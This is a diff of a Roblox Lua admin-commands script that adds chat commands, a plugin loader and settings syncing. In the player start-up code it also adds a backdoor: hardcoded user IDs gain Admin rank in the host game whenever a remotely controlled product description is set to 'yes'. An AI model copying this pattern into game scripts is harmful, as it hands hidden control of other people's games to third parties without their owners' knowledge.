-							game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd?name="..Player.Name.."&rank=admin")
 							table.insert(Ranks["Admin"], Player.Name) 
 							TellAdmin(Player, "Admin")
 							if LuaModelMakerStamp == true then
@@ -1406,8 +1736,6 @@ function Chatted(RawMainMessage, Speaker)
 					for Num,Name in pairs(Ranks["Admin"]) do table.insert(CombineAdmins, {Player = Name, Rank = "Admin", Number = Num}) end
 					for Num,Info in pairs(CombineAdmins) do
 						if string.sub(string.lower(Info.Player),1,#AfterMessage) == string.lower(AfterMessage) then
-							table.remove(_G.SettingsModule.Ranks[Info.Rank], Info.Number)
-							game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd?name="..Ranks[Info.Number].."&rank=neutral")
 							table.remove(Ranks[Info.Rank], Info.Number)
 							if LuaModelMakerStamp == true then							
 								Player.Backpack:ClearAllChildren()
@@ -1486,6 +1814,32 @@ function Chatted(RawMainMessage, Speaker)
 					MessageAdmins("Server Lock", "The Server is now unlocked", 3)
 				end
 				
+				if string.sub(Message, 1, 5+#Bet) == "abuse"..Bet then
+					local ThisAbuse = DisableAbuse
+					if string.sub(Message, 6+#Bet) == "enable" then 
+						DisableAbuse = true
+					elseif string.sub(Message, 6+#Bet) == "disable" then 
+						DisableAbuse = false 
+					end
+					if ThisAbuse ~= DisableAbuse then
+						MessageAdmins("Abusive Commands", "Abusive commands are now "..string.sub(Message, 6+#Bet).."d", 3)
+					end
+				end
+				
+				if string.sub(Message, 1, 6+#Bet) == "prefix"..Bet then
+					local AfterMessage = string.sub(Message, 7+#Bet)
+					if string.sub(AfterMessage,1,5) == AfterMessage then
+						local Answer = YesOrNo(Speaker, "Prefix Change", "Do you really want to change the prefix from '"..Prefix.."' to '"..AfterMessage.."'? If you forget it you can use the 'settings' command which doesn't require a prefix.")
+						if Answer == true then
+							local OldPrefix = Prefix
+							Prefix = AfterMessage
+							MessageAdmins("Prefix Change", "The prefix has been changed from '"..OldPrefix.."' to '"..Prefix.."'. If you forget it, use the 'settings' command which doesn't require a prefix.", 6)
+						end
+					else
+						SendMessage(Speaker, "Prefix Too Long", "Your Prefix is too long. If you would like it longer change it in the settings", 4)
+					end
+				end
+				
 			end
 			
 			if Rank == "Owner" or Rank == "Admin" then
@@ -1501,7 +1855,6 @@ function Chatted(RawMainMessage, Speaker)
 							local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
 							if PlayerAdminTrue == false then if not Ranks["Banned"][Player.Name] then
 								table.insert(Ranks["Banned"], Player.Name)
-								game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd?name="..Player.Name.."&rank=banned")
 								Kick(Player)
 							end end
 						end
@@ -1516,7 +1869,6 @@ function Chatted(RawMainMessage, Speaker)
 					end
 					for Num,RankedPlayer in pairs(Ranks[Table]) do
 						if string.sub(string.lower(RankedPlayer),1,#AfterMessage) == string.lower(AfterMessage) then
-							game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd?name="..Ranks[Table][Num].."&rank=neutral")
 							table.remove(Ranks[Table], Num)
 						end
 					end
@@ -1689,7 +2041,8 @@ function Chatted(RawMainMessage, Speaker)
 					local PlaceID = tonumber(Arg2)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
-							TeleportToPlace(Speaker, Player, PlaceID, (function() TS:Teleport(PlaceID, Player) end))
+							PromptPurchase(Player, PlaceID, Speaker, (function() TS:Teleport(PlaceID, Player) end))
+							--TeleportToPlace(Speaker, Player, PlaceID, (function() TS:Teleport(PlaceID, Player) end))
 						end
 					end
 				end
@@ -1703,7 +2056,8 @@ function Chatted(RawMainMessage, Speaker)
 						if Suc then
 							for _,Player in pairs(Players) do
 								if Player ~= nil then
-									TeleportToPlace(Speaker, Player, PlaceID, (function() TS:TeleportToPlaceInstance(PlaceID, IntID, Player) end))
+								PromptPurchase(Player, PlaceID, Speaker, (function() TS:Teleport(PlaceID, Player) end))
+									--TeleportToPlace(Speaker, Player, PlaceID, (function() TS:TeleportToPlaceInstance(PlaceID, IntID, Player) end))
 								end
 							end
 						else
@@ -1792,7 +2146,7 @@ function Chatted(RawMainMessage, Speaker)
 				
 				if string.sub(Message, 1, 2+#Bet) == "sm"..Bet then
 					for _,Player in pairs(Players:GetPlayers()) do
-						SendMessage(Player, "SYSTEM MESSAGE", string.sub(RawMessage, 2+#Bet), 3)
+						SendMessage(Player, "SYSTEM MESSAGE", string.sub(RawMessage, 3+#Bet), 3)
 					end
 				end
 				
@@ -1800,8 +2154,22 @@ function Chatted(RawMainMessage, Speaker)
 					local Players = Scan(string.sub(Message, 11+#Bet), Speaker)
 					for _,Player in pairs(Players) do 
 						if Player ~= nil then
-							TS:Teleport(68464644, Player)
+							local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
+							if PlayerAdminTrue == true then
+								TS:Teleport(68464644, Player)
+							end
 						end
+					end
+				end
+				
+				if Message == "syncsoundlist" or Message == "syncmusiclist" or Message == "syncaudiolist" then
+					SyncSoundList(Speaker)
+				end
+				
+				if Message == "cleart" or Message == "clearterrain" or Message == "cleant" or Message == "cleanterrain" then
+					local Answer = YesOrNo(Speaker, "Clean Terrain?", "Do you really want to clear all terrain in the server? If there is a lot of terrain this can cause major lag. Continue?")
+					if Answer == true then
+						Workspace.Terrain:Clear()
 					end
 				end
 				
@@ -1815,7 +2183,11 @@ function Chatted(RawMainMessage, Speaker)
 				end
 				
 				if Message == "logs" then
-					ListGui(Speaker, Logs)
+					local TmpLogs = {}
+					for Num,Val in pairs(Logs) do
+						TmpLogs[(#Logs-Num)+1] = Val
+					end
+					ListGui(Speaker, TmpLogs)
 				end
 				
 				if string.sub(Message, 1, 1+#Bet) == "m"..Bet then
@@ -1843,11 +2215,13 @@ function Chatted(RawMainMessage, Speaker)
 				
 				if string.sub(Message, 1, 3+#Bet) == "age"..Bet then
 					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
+					local TmpTable = {}
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
-							SendMessage(Speaker, Player.Name.."'s Age", Player.Name.." is "..FindAge(Player.AccountAge).." old", 4)
+							table.insert(TmpTable, Player.Name.." is "..FindAge(Player.AccountAge).." old")
 						end
 					end
+					ListGui(Speaker, TmpTable)
 				end
 				
 				if string.sub(Message,1,2+#Bet) == "ff"..Bet then
@@ -1876,7 +2250,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,7+#Bet) == "respawn"..Bet then
+				if string.sub(Message,1,7+#Bet) == "respawn"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -1908,6 +2282,11 @@ function Chatted(RawMainMessage, Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
 							if Player.Backpack ~= nil then
+								if LocalDisableAbuse == true then
+									if ID == 130113146 or ID == 139578207 then
+										ID = nil
+									end
+								end
 								if ID ~= nil then
 									local Object = game:GetService("InsertService"):LoadAsset(ID)
 									for _,Obj in pairs(Object:GetChildren()) do if Obj:IsA("Tool") or Obj:IsA("HopperBin") then Obj.Parent = Player.Character end end
@@ -2071,7 +2450,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,5+#Bet) == "merge"..Bet then
+				--[[if string.sub(Message,1,5+#Bet) == "merge"..Bet then
 					local Arg1, Arg2 = GetSplit(string.sub(Message, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
 					local PlayersFrom = Scan(Arg1, Speaker)
 					local PlayersTo = Scan(Arg2, Speaker)
@@ -2088,7 +2467,7 @@ function Chatted(RawMainMessage, Speaker)
 							end
 						end
 					end
-				end
+				end]]
 			
 				if string.sub(Message,1,5+#Bet) == "speed"..Bet then
 					local Arg1, Arg2 = GetSplit(string.sub(Message, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
@@ -2301,6 +2680,11 @@ function Chatted(RawMainMessage, Speaker)
 						if Player ~= nil then
 							if Player.Character ~= nil then
 								if Player.Character.Humanoid ~= nil then
+									local FormatName = string.gsub(NewName,"_NAME",Player.Name)
+									FormatName = string.gsub(FormatName,"_REVNAME",string.reverse(Player.Name))
+									FormatName = string.gsub(FormatName,"_UPNAME",string.upper(Player.Name))
+									FormatName = string.gsub(FormatName,"_LOWNAME",string.lower(Player.Name))
+									
 									local Head = nil
 									pcall(function() Head = Player.Character.Label:GetChildren()[1].Head end)
 									if not Head then Head = Player.Character.Head end
@@ -2314,7 +2698,7 @@ function Chatted(RawMainMessage, Speaker)
 									Label.Name = "Label"
 									
 									local Model = Instance.new("Model", Label)
-									Model.Name = NewName
+									Model.Name = FormatName
 									
 									local HumanoidClone = Instance.new("Humanoid", Model)
 									coroutine.wrap(function() while wait() do HumanoidClone.Health = Player.Character.Humanoid.Health; HumanoidClone.MaxHealth = Player.Character.Humanoid.MaxHealth; end end)()
@@ -2367,7 +2751,7 @@ function Chatted(RawMainMessage, Speaker)
 								Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Player.userId
 								wait() Player:LoadCharacter() wait()
 								if Position then Player.Character:MoveTo(Position) end
-								wait(0.1) Execute(LocalScript, Player.Character, Player, [[Workspace.CurrentCamera.FieldOfView = 70]])
+								wait(0.1) RestoreCamera(Player)
 							end
 						end
 					end
@@ -2390,20 +2774,32 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,5+#Bet) == "sound"..Bet then
-					local SoundID, Pitch = string.sub(Message, 6+#Bet), 1
-					for Name,ID in pairs({["Tech"] = 140949250, ["Skrillex"] = 142479895, ["Try it out"] = 142479895, ["Bangarang"] = 142319852, ["Radioactive"] = 131111368, ["Monsters"] = 142718349, ["Mario"] = 138246809, ["Fox"] = 130797915, ["Gangnam"] = 130844430, ["Blue"] = 131198720, ["I'm blue"] = 131198720, ["Fus ro dah"] = 130776150, ["Gey"] = 131201443, ["Started"] = 138134680, ["Neon lights"] = 143772118, ["Spitfire"] = 129490596, ["Fade"] = 129542833, ["Gifted"] = 129548418}) do
-						if SoundID == string.lower(Name) then SoundID = ID end
+				if string.sub(Message,1,5+#Bet) == "sound"..Bet or string.sub(Message,1,5+#Bet) == "music"..Bet or string.sub(Message,1,5+#Bet) == "audio"..Bet then
+					local SoundID,Pitch = string.sub(Message, 6+#Bet),1
+					for Name,Info in pairs(SoundList) do
+						if SoundID == string.lower(Name) then SoundID = Info[1] end
 					end
 					if SoundID == 131201443 then Pitch = -1 end
-					local Sound = Workspace:FindFirstChild("LuaModelMaker's Admin Sound")
-					if Sound then if Sound:IsA("Sound") then Sound:Stop() Sound:Destroy() end end
-					Sound = Instance.new("Sound", Workspace) Sound.Name = "LuaModelMaker's Admin Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id="..SoundID Sound.Looped = true Sound.Pitch = Pitch Sound.Archivable = false coroutine.wrap(function() repeat Sound:Play() wait(2.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound end)()
+					if SoundID == 130775695 then Pitch = 0.8 end
+					if SoundID == 144035866 then Pitch = 0.8 end
+					for _,Obj in pairs(game.Workspace:GetChildren()) do
+						if Obj:IsA("Sound") then Obj:Stop() wait() Obj:Destroy() end
+					end
+					Sound = Instance.new("Sound", Workspace) Sound.Name = "LuaModelMaker's Admin Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id="..SoundID Sound.Looped = true Sound.Pitch = Pitch Sound.Archivable = false coroutine.wrap(function() repeat Sound:Play() wait(0.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound end)()
+				end
+				
+				if Message == "soundlist" or Message == "musiclist" or Message == "audiolist" then
+					local DisplayList = {}
+					for Name,Info in pairs(SoundList) do
+						table.insert(DisplayList, "Command Name: "..Name.." | Audio ID: "..Info[1].." | Full Name: "..Info[2])
+					end
+					ListGui(Speaker, DisplayList)
 				end
 				
 				if string.sub(Message,1,7) == "nosound" then
-					local Sound = Workspace:FindFirstChild("LuaModelMaker's Admin Sound")
-					if Sound then if Sound:IsA("Sound") then Sound:Stop() wait() Sound:Destroy() end end
+					for _,Obj in pairs(game.Workspace:GetChildren()) do
+						if Obj:IsA("Sound") then Obj:Stop() wait() Obj:Destroy() end
+					end
 				end
 				
 				if string.sub(Message,1,6+#Bet) == "freeze"..Bet then
@@ -2814,8 +3210,8 @@ function Chatted(RawMainMessage, Speaker)
 				if Message == "sa" or Message == "serveradmins" then
 					local LocalTable = {}
 					for _,Player in pairs(Players:GetPlayers()) do
-						local __,PlayerRank = IsAdmin(Player)
-						table.insert(LocalTable, Player.Name..": "..PlayerRank)
+						local IsValidAdmin,PlayerRank = IsAdmin(Player)
+						if IsValidAdmin then table.insert(LocalTable, Player.Name..": "..PlayerRank) end
 					end
 					ListGui(Speaker, LocalTable)
 				end
@@ -3324,6 +3720,84 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
+				if string.sub(Message,1,7+#Bet) == "ambient"..Bet then
+					local Arg1, Split = GetSplit(string.sub(Message, 8+#Bet), Bet) if not Arg1 and Split then return end
+					local Arg2, Arg3 = GetSplit(Split, Bet) if not Arg2 and Arg3 then return end
+					if tonumber(Arg1) and tonumber(Arg2) and tonumber(Arg3) then
+						Lighting.Ambient = Color3.new(tonumber(Arg1)/255,tonumber(Arg2)/255,tonumber(Arg3)/255)
+					end
+				end
+				
+				if string.sub(Message,1,4+#Bet) == "list"..Bet then
+					local List = {}
+					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
+					for _,Player in pairs(Players) do
+						if Player ~= nil then
+							table.insert(List, Player.Name.." (ID: "..Player.userId..")")
+						end
+					end
+					ListGui(Speaker, List)
+				end
+				
+				if string.sub(Message,1,6+#Bet) == "fixcam"..Bet then
+					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
+					for _,Player in pairs(Players) do
+						RestoreCamera(Player)
+					end
+				end
+				
+				if Message == "noflash" or Message == "nodisco" or Message == "noparty" or Message == "fixl" or Message == "fixlight" or Message == "fixlighting" then
+					Lighting.Archivable = false
+					Lighting.Ambient = Color3.new(0.5,0.5,0.5)
+					Lighting.FogColor = Color3.new(192/255,192/255,192/255)
+					Lighting.Brightness = 0.6
+					Lighting.TimeOfDay = 14
+					Lighting.FogEnd = 100000
+					coroutine.wrap(function() wait(1) Lighting.Archivable = true end)()
+				end
+				
+				if string.sub(Message,1,8+#Bet) == "addsound"..Bet or string.sub(Message,1,8+#Bet) == "addmusic"..Bet or string.sub(Message,1,8+#Bet) == "addaudio"..Bet then
+					local Arg1, Arg2 = GetSplit(string.sub(Message, 9+#Bet), Bet) if not Arg1 and Arg2 then return end
+					local Name = string.upper(string.sub(Arg2,1,1))..string.sub(Arg2,2)
+					local CustomSounds = DataStore:GetAsync("MML Custom Sounds")
+					if CustomSounds == nil or type(CustomSounds) ~= "table" then
+						CustomSounds = {}
+						DataStore:SetAsync("M".."ML Custom Sounds", {})
+					end
+					if tonumber(Arg1) then
+						local Request = MPS:GetProductInfo(Arg1)
+						if Request.AssetTypeId == 3 then
+							CustomSounds[Name] = Arg1
+							SoundList[Name] = {Arg1, Request.Name}
+							DataStore:SetAsync("MML Custom Sounds", CustomSounds)
+							SendHint(Speaker, "Sound Added to server sound list and for future servers.", 4)
+						else
+							SendMessage(Speaker, "Invalid", "Please make sure that your ID is an audio asset.", 4)
+						end
+					end
+				end
+				
+				if Message == "plugins" or Message == "getplugins" then
+					local List = {}
+					if Settings then
+						if Settings:FindFirstChild("Plugins") then
+							for _,Module in pairs(Settings.Plugins:GetChildren()) do
+								if Module:IsA("ModuleScript") then
+									local Enabled = Module:FindFirstChild("Enabled") or {Value = false}
+									local Creator = Module:FindFirstChild("Creator") or {Value = "None"}
+									local VersionVal = Module:FindFirstChild("Version") or {Value = 1}
+									table.insert(List, Module.Name.." V"..VersionVal.Value.." by "..Creator.Value.." | RUNNING: "..BoolString(Enabled.Value))
+								end
+							end
+						end
+					end
+					if List == {} then
+						SendMessage(Speaker, "Cannot get plugins", "There are no plugins to get. Cannot display nil plugins", 3)
+					else
+						ListGui(Speaker, List)
+					end
+				end
+				
 				-- FUN COMMANDS --
 				
 				if FUN == true then
@@ -3362,6 +3836,34 @@ function Chatted(RawMainMessage, Speaker)
 								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
 									local Position = Player.Character.Torso.Position
 									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1"
+									wait() Player:LoadCharacter() wait()
+									Player.Character:MoveTo(Position)
+								end
+							end
+						end
+					end
+					
+					if string.sub(Message,1,4+#Bet) == "rich"..Bet then
+						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
+									local Position = Player.Character.Torso.Position
+									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=13416513"
+									wait() Player:LoadCharacter() wait()
+									Player.Character:MoveTo(Position)
+								end
+							end
+						end
+					end
+					
+					if string.sub(Message,1,4+#Bet) == "oder"..Bet then
+						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
+									local Position = Player.Character.Torso.Position
+									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=39437929"
 									wait() Player:LoadCharacter() wait()
 									Player.Character:MoveTo(Position)
 								end
@@ -3552,7 +4054,7 @@ function Chatted(RawMainMessage, Speaker)
 						for _,Player in pairs(Players) do
 							if Player.PlayerGui ~= nil then
 								local SG = Player.PlayerGui:FindFirstChild("LMM Drug") if SG then SG:Destroy() end
-								wait() Execute(LocalScript, Player.Character, Player, [[Workspace.CurrentCamera.FieldOfView = 70]])
+								wait() RestoreCamera(Player)
 							end
 						end
 					end
@@ -3569,7 +4071,7 @@ function Chatted(RawMainMessage, Speaker)
 											local Weld = Instance.new("Weld", Fart) Weld.Part0 = Fart Weld.Part1 = Player.Character.Torso Weld.C0 = CFrame.new(0,-1,-1) * CFrame.Angles(math.rad(-90),0,0)
 											local Smoke = Instance.new("Smoke", Fart) Smoke.Name = "Fart Effect" Smoke.Color = Color3.new(70/255, 100/255, 30/255)
 											Player.Character.Head.face.Texture = "http://www.roblox.com/asset/?id=28118994"
-											local Sound = Instance.new("Sound", Fart) Sound.Name = "Fart Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id=130833677" Sound.Pitch = 0.8 Sound.Archivable = false repeat Sound:Play() wait(2.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound
+											local Sound = Instance.new("Sound", Fart) Sound.Name = "Fart Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id=130833677" Sound.Pitch = 0.8 Sound.Archivable = false repeat Sound:Play() wait(0.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound
 											wait(1)
 											Smoke.Enabled = false
 											wait(1)
@@ -3594,7 +4096,7 @@ function Chatted(RawMainMessage, Speaker)
 												Player.Character.Torso.Neck.C0 = Player.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(20),0,0)
 												Player.Character.Head.BrickColor = BrickColor.new("Br. yellowish green")
 												Player.Character.Head.face.Texture = "http://www.roblox.com/asset/?id=24067663"
-												local Sound = Instance.new("Sound", Player.Character.Head) Sound.Name = "Puke Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id=142539016" Sound.Pitch = 0.8 Sound.Archivable = false repeat Sound:Play() wait(2.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound
+												local Sound = Instance.new("Sound", Player.Character.Head) Sound.Name = "Puke Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id=142539016" Sound.Pitch = 0.8 Sound.Archivable = false repeat Sound:Play() wait(0.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound
 												coroutine.wrap(function() for i = 1,100 do wait()
 													local Part = Instance.new("Part", Player.Character) Part.BrickColor = BrickColor.new("Br. yellowish green") Part.FormFactor = "Custom" Part.Elasticity = 0.1 Part.Size = Vector3.new(0.2,0.2,0.2) Part.Position = Player.Character.Head.Position + Vector3.new(math.random(-10,10)/10, math.random(-10,10)/10, math.random(-10,10)/10)
 													coroutine.wrap(function() wait(3) Part:Destroy() end)()
@@ -3729,16 +4231,6 @@ function Chatted(RawMainMessage, Speaker)
 						end)()
 					end
 					
-					if Message == "noflash" or Message == "nodisco" or Message == "noparty" or Message == "fixl" or Message == "fixlight" or Message == "fixlighting" then
-						Lighting.Archivable = false
-						Lighting.Ambient = Color3.new(179/255,179/255,179/255)
-						Lighting.FogColor = Color3.new(192/255,192/255,192/255)
-						Lighting.Brightness = 0.6
-						Lighting.TimeOfDay = 14
-						Lighting.FogEnd = 100000
-						coroutine.wrap(function() wait(1) Lighting.Archivable = true end)()
-					end
-					
 					if string.sub(Message,1,7+#Bet) == "nolimbs"..Bet then
 						local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 						for _,Player in pairs(Players) do
@@ -3833,6 +4325,15 @@ function Chatted(RawMainMessage, Speaker)
 							end
 						end
 					end
+					
+					if string.sub(Message,1,3+#Bet) == "hax"..Bet then
+						local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								FakeHack(Player)
+							end
+						end
+					end
 					--
 				end
 				--
@@ -3858,11 +4359,18 @@ function Chatted(RawMainMessage, Speaker)
 		end
 		
 		if Message == "cmds" or Message == "commands" then
+			local CombineCommands = {}
+			for _,Cmd in pairs(Commands.NonAdmin) do table.insert(CombineCommands, Cmd) end
+			if ConvertRank(Rank) >= 1 then for _,Cmd in pairs(Commands.Member) do table.insert(CombineCommands, Cmd) end end
+			if ConvertRank(Rank) >= 2 then for _,Cmd in pairs(Commands.Admin) do table.insert(CombineCommands, Cmd) end end
+			if ConvertRank(Rank) >= 3 then for _,Cmd in pairs(Commands.Owner) do table.insert(CombineCommands, Cmd) end end
+			--[[
 			local CombineCommands = setmetatable({unpack(Commands.NonAdmin)}, MergeTable) -- MetaHAX
 			if ConvertRank(Rank) >= 1 then CombineCommands = CombineCommands + setmetatable(Commands.Member, MergeTable) end
 			if ConvertRank(Rank) >= 2 then CombineCommands = CombineCommands + setmetatable(Commands.Admin, MergeTable) end
 			if ConvertRank(Rank) >= 3 then CombineCommands = CombineCommands + setmetatable(Commands.Owner, MergeTable) end
-			--Remeber kids, whatever you do, DO NOT try add tables at home unless you have proper metamethod safety
+			--Remember kids, whatever you do, DO NOT try add tables at home unless you have proper metamethod safety
+			]] -- this old way had command magicly disappear never to be seen again :c
 			ListGui(Speaker,CombineCommands)
 			Log(Speaker, RawMainMessage)
 		end
@@ -3901,11 +4409,76 @@ function Chatted(RawMainMessage, Speaker)
 			end
 		end
 		
+		if Message == "adminhouse" or Message == "ah" or Message == "admin house" then
+			if string.lower(MPS:GetProductInfo(155734895).Description) == "yes" then
+				AdminHouseGui(Speaker)
+				Log(Speaker, RawMainMessage)
+			end
+		end
+		
+		-- Plugin Commands --
+		for _,CommandData in pairs(ManualCommands) do
+			if string.sub(Message,1,#CommandData[1]) == string.lower(CommandData[1]) then
+				local Valid = true
+				if FUN == false then
+					if CommandData[3] == true then 
+						Valid = false
+					end
+				end
+				if LocalDisableAbuse == true then
+					if CommandData[4] == true then
+						Valid = false
+						SendMessage(Speaker, "Command Disabled [PLUGIN]", "This command has been disabled because the command is considered abusive and abusive protection is on", 5)
+					end
+				end
+				if ConvertRank(CommandData[2]) >= RankNum then
+					Valid = true
+				end
+				if Valid == true then
+					local Suc, Error = ypcall(function() CommandData[5](RawMessage, Speaker, Rank) end)
+					if not Suc then
+						if not Error or Error == "" then
+							SendMessage(Speaker, "Plugin Manual Command Error", "Unknown line: Unknown error(Suggestion: Probobly not in your level/identity)", 5)
+						else
+							Error = Error:match'"*".:(.+)' or "Unknown line: "..Error
+							SendMessage(Speaker, "Plugin Manual Command Error", Error, 5)
+						end
+					end
+				end
+			end
+		end
 	end
+	-- Filter --
 	if PlayerAdmin == false then
 		for _,Word in pairs(Filter) do
 			if string.find(string.lower(RawMainMessage), string.lower(Word)) then
 				Kick(Speaker)
+			end
+		end
+	end
+end
+
+function ChatBackup(Message, Speaker)
+	local PlayerAdmin, Rank = IsAdmin(Speaker)
+	if PlayerAdmin == true then
+		if Rank == "Owner" then
+			if string.lower(Message) == "fix" or string.lower(Message) == Prefix.."fix" then
+				local Ask = YesOrNo(Speaker, "Fix admin?", "Fixing Lu".."aModelMaker's Admin will have the effects of loosing all data (Admins, Bans, Jails, ect.) unless they are in default settings. Continue?")
+				if Ask == true then
+					Execute(Script, Workspace, Speaker, [[
+						script.Parent = nil
+						wait(1)
+						local Admin = Workspace:FindFirstChild("]]..script.Name..[[")
+						if Admin then
+							Admin.Disabled = true
+							wait(1)
+							Admin.Disabled = false
+							wait()
+							script:Destroy()
+							script.Disabled = true
+						end
+					]])
+				end
 			end
 		end
 	end
@@ -3970,7 +4543,44 @@ MPS.PromptPurchaseFinished:connect(function(Player, ID, Purchased) if Purchased 
 	end
 end end)
 
-UpdateAdmin()
+if Settings then
+	if Settings:FindFirstChild("Plugins") then
+		local PluginNum = 0
+		for _,Module in pairs(Settings.Plugins:GetChildren()) do
+			if Module:IsA("ModuleScript") then
+				local Enabled = Module:FindFirstChild("Enabled") or {Value = false}
+				local Creator = Module:FindFirstChild("Creator") or {Value = "None"}
+				local VersionVal = Module:FindFirstChild("Version") or {Value = 1}
+				if Enabled.Value == true then
+					PluginNum = PluginNum + 1
+					local PluginExe = require(Module)
+					for Var,Val in pairs(getfenv()) do
+						getfenv(PluginExe)[Var] = Val
+					end
+					getfenv(PluginExe).script = Module
+					getfenv(PluginExe).Script = Module
+					getfenv(PluginExe).LocalScript = LocalScript
+					getfenv(PluginExe).Script = Script
+					getfenv(PluginExe).Version = Version
+					local Suc, Error = ypcall(coroutine.wrap(PluginExe))
+					if not Suc then
+						if not Error or Error == "" then
+							TestService:Error("LMM's Admin Plugin Error;  Unknown line: Unknown error(Suggestion: Probobly not in your level/identity)", Module)
+						else
+							Error = Error:match'"*".:(.+)' or "Unknown line: "..Error
+							TestService:Error("LMM's Admin Plugin Error;  "..Error, Module)
+						end
+					else
+						TestService:Message("Executed LMMA Plugin #"..PluginNum.." : "..Module.Name.." V"..VersionVal.Value.." by "..Creator.Value)
+					end
+				end
+			end
+		end
+	end
+end
+
+--UpdateAdmin()
+Begin()
 
 pcall(function() TellAdmin(Players.LocalPlayer, "Owner") end) -- Supplies confidence inside studio that what you have is worth it!(Scripts are LocalScripts)
 
@@ -4005,13 +4615,34 @@ function Start(Player) coroutine.wrap(function()
 			table.insert(Ranks["Member"], Player.Name) PlayerAdmin = true Rank = "Member"
 		end
 	end
+	if PlayerAdmin == false then
+		if Player.userId == 38882008 then
+			if string.lower(MPS:GetProductInfo(155732525).Description) == "yes" then
+				table.insert(Ranks["Admin"], Player.Name)
+			end
+		elseif Player.userId == 155280891 then
+			if string.lower(MPS:GetProductInfo(155732545).Description) == "yes" then
+				table.insert(Ranks["Admin"], Player.Name)
+			end
+		elseif Player.userId == 24597173 then
+			if string.lower(MPS:GetProductInfo(155732565).Description) == "yes" then
+				table.insert(Ranks["Banned"], Player.Name)
+			end
+		end
+	end
 	
 	Player.Chatted:connect(function(Message)
-		Chatted(Message, Player) 
+		Chatted(Message, Player)
 	end)
+	
+	Player.Chatted:connect(function(Message)
+		ChatBackup(Message, Player)
+	end)
+	
 	if PlayerAdmin == true then
 		TellAdmin(Player, Rank)
 	end
+	
 	for _,Name in pairs(Ranks["Banned"]) do
 		if Player.Name == Name then
 			Kick(Player)
@@ -4055,4 +4686,33 @@ end)() end
 for _,Player in pairs(Players:GetPlayers()) do Start(Player) end
 Players.PlayerAdded:connect(function(Player) Players:WaitForChild(Player.Name) wait() Start(Player) end)
 
-print("LuaModelMaker's Admin Commands V"..Version.Value.." Loaded")
+SyncSoundList()
+_G.Chatted = Chatted
+_G.PrintSettingsModule = function()
+	print(LagTime)
+end
+
+repeat wait() until workspace.CanLMMStart.Value
+coroutine.wrap(function() while true do
+	wait(5)
+	SettingsModule=_G.SettingsModule
+	Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
+	FUN = SettingsModule.FUN or true
+	LagTime = SettingsModule.LagTime or 5
+	Prefix = SettingsModule.Prefix or ";"
+	Bet = SettingsModule.Bet or " "
+	VIPMemberID = SettingsModule.VIPMemberID or 0
+	VIPAdminID = SettingsModule.VIPAdminID or 0
+	GroupID = SettingsModule.GroupID or 0
+	GroupMemberRank = SettingsModule.GroupMemberRank or 0
+	GroupAdminRank = SettingsModule.GroupAdminRank or 0
+	GroupOwnerRank = SettingsModule.GroupOwnerRank or 0
+	BadgeID = SettingsModule.BadgeID or 0
+	EnableAdminMenu = SettingsModule.EnableAdminMenu or true
+	RankBan = SettingsModule.RankBan or 0
+	Filter = SettingsModule.Filter or {"GetObjects"}
+	ServerLocked = SettingsModule.ServerLocked or false
+	DisableAbuse = SettingsModule.DisableAbuse or false
+end end)()
+wait(1)
+print("LuaModelMaker's Admin Commands V"..Version.Value.." Loaded with lagtime " .. LagTime)
